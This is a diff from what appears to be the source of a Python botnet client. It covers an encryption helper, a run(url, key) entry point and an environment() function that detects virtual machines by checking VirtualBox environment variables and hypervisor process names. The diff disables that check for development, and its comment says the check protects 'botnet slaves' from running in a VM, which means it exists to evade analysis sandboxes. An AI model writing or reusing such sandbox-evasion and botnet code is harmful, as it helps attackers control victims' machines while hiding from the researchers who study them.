@@ -39,9 +39,12 @@ def decrypt(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0))
     return str().join(result).rstrip(padding)
 
 def environment():
-    environment = [key for key in os.environ if 'VBOX' in key]
-    processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
-    return bool(environment + processes)
+    # environment = [key for key in os.environ if 'VBOX' in key]
+    # processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
+    # This is commented out so I can develop with a VM
+    # Revert this change if you want to protect your botnet slaves from running in a VM
+    #return bool(environment + processes)
+    return bool(True)
 
 def run(url=None, key=None):
     if url:
